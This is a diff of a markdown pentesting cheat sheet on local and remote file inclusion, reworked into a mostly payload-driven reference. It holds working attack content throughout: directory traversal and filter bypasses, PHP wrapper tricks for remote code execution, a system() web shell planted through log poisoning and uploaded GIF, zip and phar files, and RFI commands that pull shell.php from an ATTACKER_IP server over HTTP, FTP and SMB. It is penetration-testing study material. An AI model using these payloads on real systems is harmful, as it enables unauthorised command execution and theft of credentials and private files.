@@ -1,38 +1,45 @@
-# Testing for LFI
+# LFI / RFI
 
-### LFI Local File Inclusion
+## File Inclusion Functions (Read/Execute/Remote)
 
-#### Introduction
+| Function | Read | Execute | Remote |
+|----------|------|---------|--------|
+| **PHP** |
+| `include()` / `include_once()` | ✅ | ✅ | ✅ |
+| `require()` / `require_once()` | ✅ | ✅ | ❌ |
+| `file_get_contents()` | ✅ | ❌ | ✅ |
+| `fopen()` / `file()` | ✅ | ❌ | ❌ |
+| **NodeJS** |
+| `fs.readFile()` | ✅ | ❌ | ❌ |
+| `res.render()` | ✅ | ✅ | ❌ |
+| **Java** |
+| `include` | ✅ | ❌ | ❌ |
+| `import` | ✅ | ✅ | ✅ |
+| **.NET** |
+| `@Html.Partial()` | ✅ | ❌ | ❌ |
+| `Response.WriteFile()` | ✅ | ❌ | ❌ |
+| `include` | ✅ | ✅ | ✅ |
 
-* An attacker can use Local File Inclusion (LFI) to trick the web application into exposing or running files on the web server.
-* LFI occurs when an application uses the path to a file as input. If the application treats this input as trusted, a local file may be used in the include statement.
-*
+---
 
-    <figure><img src="https://user-images.githubusercontent.com/75596877/138767265-ed9d8d7f-38f2-43cf-9622-8d4890f0664e.png" alt=""><figcaption></figcaption></figure>
+## Basic LFI Test Payloads
 
-**Example:**
+```bash
+# Linux
+/etc/passwd
+../../../etc/passwd
+....//....//....//....//etc/passwd
+..%2F..%2F..%2Fetc%2Fpasswd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
 
+# Windows
+C:\Windows\boot.ini
+..\..\..\..\windows\win.ini
 ```
-/**
-* Get the filename from a GET input
-* Example - http://example.com/?file=filename.php
-*/
-$file = $_GET['file'];
 
-/**
-* Unsafely include the file
-* Example - filename.php
-*/
-include('directory/' . $file);
-```
+---
 
-* In the above example, an attacker could make the following request. It tricks the application into executing a PHP script such as a web shell that the attacker managed to upload to the web server.
-
-```
-http://example.com/?file=../../uploads/evil.php
-```
-
-#### Directory Traversal
+## Directory Traversal
 
 * Even without the ability to upload and execute code, a Local File Inclusion vulnerability can be dangerous.
 * An attacker can still perform a Directory Traversal / Path Traversal attack using an LFI vulnerability as follows.
@@ -63,29 +70,101 @@ http://172.16.1.10/nav.php?page=php://filter/convert.base64-encode/resource=../.
 http://172.16.1.10/nav.php?page=php://filter/convert.base64-encode/resource=../../../../../../../../../var/www/html/wordpress/index.php
 ```
 
-#### PHP Wrappers
+---
 
-* PHP has a number of wrappers that can often be abused to bypass various input filters.
+## LFI Bypass Techniques
 
-**PHP Expect Wrapper**
+### Non-Recursive Filter Bypass
 
-* `PHP expect://` allows execution of system commands, unfortunately the expect PHP module is not enabled by default
+If `../` is filtered but not recursively:
 
-```
-php?page=expect://ls
-```
-
-**PHP Filter Wrapper**
-
-`php://filter` allows a pen tester to include local files and base64 encodes the output. Therefore, any base64 output will need to be decoded to reveal the contents.
-
-```
-http://example.thm.labs/page.php?file=php://filter/resource=/etc/passwd
-http://example.thm.labs/page.php?file=php://filter/read=string.rot13/resource=/etc/passwd 
-http://example.thm.labs/page.php?file=php://filter/convert.base64-encode/resource=/etc/passwd
+```bash
+....//....//....//....//etc/passwd
+..././..././..././etc/passwd
+....\/....\/....\/etc/passwd
 ```
 
-* First one will often fail because it attempts to execute the php code, thus converting to ROT13 or base64 will help achieve LFI
+### URL Encoding
+
+```bash
+# Single encoded
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+
+# Double encoded
+%252e%252e%252f%252e%252e%252fetc%252fpasswd
+```
+
+### Approved Path Bypass
+
+If input must start with approved path:
+
+```bash
+./languages/../../../../etc/passwd
+```
+
+### Null Byte (PHP < 5.5)
+
+```bash
+../../../etc/passwd%00
+../../../etc/passwd%00.php
+```
+
+### Path Truncation (PHP < 5.3)
+
+```bash
+# Generate payload with 4096+ chars
+echo -n "../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
+```
+
+---
+
+## PHP Wrappers
+
+### php://filter (Read Source Code)
+
+```bash
+# Base64 encode to read PHP source
+php://filter/convert.base64-encode/resource=config
+php://filter/read=convert.base64-encode/resource=/etc/passwd
+
+# Decode output
+echo 'BASE64_STRING' | base64 -d
+```
+
+### data:// Wrapper (RCE)
+
+Requires `allow_url_include = On`:
+
+```bash
+# Check if enabled
+curl "http://TARGET/index.php?page=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
+echo 'BASE64' | base64 -d | grep allow_url_include
+
+# Base64 encode webshell
+echo '<?php system($_GET["cmd"]); ?>' | base64
+# PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
+
+# Execute
+http://TARGET/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
+```
+
+### php://input Wrapper (RCE)
+
+```bash
+curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://TARGET/index.php?page=php://input&cmd=id"
+```
+
+### expect:// Wrapper (RCE)
+
+Requires `expect` extension:
+
+```bash
+# Check if installed
+echo 'BASE64' | base64 -d | grep expect
+
+# Execute
+curl -s "http://TARGET/index.php?page=expect://id"
+```
 
 ### LFI to RCE via Log Poisoning
 
@@ -150,15 +229,108 @@ http://example.com/index.php?page=/var/log/auth.log&cmd=id
 
 * Poison the User-Agent in access logs:
 
-```
-curl http://example.org/ -A "<?php system(\$_GET['cmd']);?>"
+```bash
+curl http://TARGET/ -A "<?php system(\$_GET['cmd']);?>"
 ```
 
 * Note: The logs will escape double quotes so use single quotes for strings in the PHP payload.
 * Then request the logs via the LFI and execute your command.
 
+```bash
+curl "http://TARGET/index.php?page=/var/log/apache2/access.log&cmd=id"
 ```
-curl http://example.org/test.php?page=/var/log/apache2/access.log&cmd=id
+
+---
+
+## Remote File Inclusion (RFI)
+
+Requires `allow_url_include = On` (except SMB on Windows).
+
+### Verify RFI
+
+```bash
+# Test with local URL first
+http://TARGET/index.php?page=http://127.0.0.1:80/index.php
+```
+
+### HTTP
+
+```bash
+# Create shell
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+
+# Start server
+sudo python3 -m http.server 80
+
+# Include
+http://TARGET/index.php?page=http://ATTACKER_IP/shell.php&cmd=id
+```
+
+### FTP
+
+```bash
+# Start FTP server
+sudo python -m pyftpdlib -p 21
+
+# Include
+http://TARGET/index.php?page=ftp://ATTACKER_IP/shell.php&cmd=id
+
+# With credentials
+http://TARGET/index.php?page=ftp://user:pass@ATTACKER_IP/shell.php&cmd=id
+```
+
+### SMB (Windows - No allow_url_include needed)
+
+```bash
+# Start SMB server
+impacket-smbserver -smb2support share $(pwd)
+
+# Include via UNC path
+http://TARGET/index.php?page=\\ATTACKER_IP\share\shell.php&cmd=whoami
+```
+
+---
+
+## LFI with File Uploads
+
+### GIF Shell
+
+```bash
+# Create malicious GIF with PHP code
+echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
+
+# Upload, then include
+http://TARGET/index.php?page=./uploads/shell.gif&cmd=id
+```
+
+### ZIP Wrapper
+
+```bash
+# Create PHP shell and zip it
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+zip shell.jpg shell.php
+
+# Upload shell.jpg, then include
+http://TARGET/index.php?page=zip://./uploads/shell.jpg%23shell.php&cmd=id
+```
+
+### Phar Wrapper
+
+```php
+<?php
+$phar = new Phar('shell.phar');
+$phar->startBuffering();
+$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
+$phar->setStub('<?php __HALT_COMPILER(); ?>');
+$phar->stopBuffering();
+```
+
+```bash
+# Compile and rename
+php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
+
+# Upload shell.jpg, then include
+http://TARGET/index.php?page=phar://./uploads/shell.jpg%2Fshell.txt&cmd=id
 ```
 
 #### LFI to RCE via credentials files
@@ -188,97 +360,54 @@ http://example.com/index.php?page=../../../../../../etc/shadow
 * Another way to gain SSH access to a Linux machine through LFI is by reading the private key file, id\_rsa.
 * If SSH is active check which user is being used `/proc/self/status` and `/etc/passwd` and try to access `/<HOME>/.ssh/id_rsa`.
 
-### Automated LFI with Wfuzz
+---
 
-* Automate LFI Tests
-* Download the `traversal.txt` file in this folder (from PayloadAllTheThings)
-* Test with `wfuzz`
+## Automated LFI Scanning
 
-```
-wfuzz -u "http://10.10.218.222/article?name=FUZZ" -w traversal.txt | grep 200
-```
+### Fuzz for Parameters
 
-* `grep 200` for the `Ok` status code
-* `w` -> the wordlist
-*   `?name=FUZZ` -> the parameter you want to fuzz
-
-    #### Resources
-* https://www.aptive.co.uk/blog/local-file-inclusion-lfi-testing/
-* https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#lfi-to-rce-via-phpinfo
-
-#### Wfuzz for LFI with a Cookie
-
-```
-wfuzz -u http://preprod-payroll.trick.htb/index.php?page=FUZZ -b PHPSESSID=lh8uclpbf9guo8ih3f6h58b2bn -w /opt/traversal.txt
+```bash
+ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
+     -u 'http://TARGET/index.php?FUZZ=value' -fs 2287 -ac
 ```
 
-### Requests to look out for
+### Fuzz for LFI
 
-*
+```bash
+# Using LFI wordlist
+ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
+     -u 'http://TARGET/index.php?page=FUZZ' -fs 2287 -ac
 
-    <figure><img src="https://miro.medium.com/max/2400/1*uMZmYUNcqjh4Rht11nGQDw.png" alt=""><figcaption></figcaption></figure>
-* We notice the request with a `?` indicating possible LFI but we are not sure the paramater it wants
-* Attempt to fuzz the parameter for command injection and file inclusion
-* Wordlist to use:
+# wfuzz alternative
+wfuzz -u "http://TARGET/index.php?page=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hh 2287
 
-{% file src="../.gitbook/assets/traversal.txt" %}
-
-```
-/usr/share/Seclists/Discovery/Web-Content/burp-parameter-names.txt
-```
-
-### FFuf API endpoints&#x20;
-
-```
-ffuf -request file.request -request-proto /usr/share/seclists/Discovery/Web-Content/api/actions-lowercase.txt
+# With cookie
+wfuzz -u "http://TARGET/index.php?page=FUZZ" -b "PHPSESSID=abc123" \
+      -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
 ```
 
-### Ffuf with burp Request
+### Fuzz for Webroot
 
-```
-ffuf -request burp.request --request-proto http -w/ usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
-```
-
-`-mc all` to match all status codes if you are getting every page 404 or something like that&#x20;
-
-### ffuf directory busting with specific extension and status code&#x20;
-
-```
-ffuf -u http://it.stg.htb/FUZZ -e .php -mc 200 -w /usr/share/seclists/Discovery/Web-Content/common.txt -b "PHPSESSID=28330d435522c7f6080f8d63b86c7daa"
+```bash
+ffuf -w /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ \
+     -u 'http://TARGET/index.php?page=../../../../FUZZ/index.php' -fs 2287
 ```
 
-### ffuf match status -mc filter status -fc
+### Fuzz for Server Files
 
-```
-ffuf -u 'http://it.stg.htb/?page=FUZZ' -mc 200 -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
-ffuf -u 'http://it.stg.htb/?page=FUZZ' -fc 200 -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
-```
+```bash
+# Linux
+ffuf -w /path/to/LFI-WordList-Linux:FUZZ \
+     -u 'http://TARGET/index.php?page=../../../../FUZZ' -fs 2287
 
-### Files to grab if you get LFI
-
-```
-/etc/passwd
-/etc/shadow
-/etc/hosts
-/etc/issue
-/etc/group
-/etc/hosts
-/etc/motd
-/etc/mysql/my.cnf
-/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
-/proc/self/environ
-/proc/version
-/proc/cmdline
-CMS Config Files
-/etc/apache2/.htpasswd
-/etc/apache2/apache2.conf
-/etc/httpd/httpd.conf
-/etc/httpd/conf/httpd.conf
-/usr/local/apache2/apache2.conf
-/var/www/html/.htpasswd
+# Windows
+ffuf -w /path/to/LFI-WordList-Windows:FUZZ \
+     -u 'http://TARGET/index.php?page=..\..\..\..\FUZZ' -fs 2287
 ```
 
-### Bypassing Path normalization
+---
+
+## Bypassing Path Normalization
 
 * If you make a request in the browser to:&#x20;
 
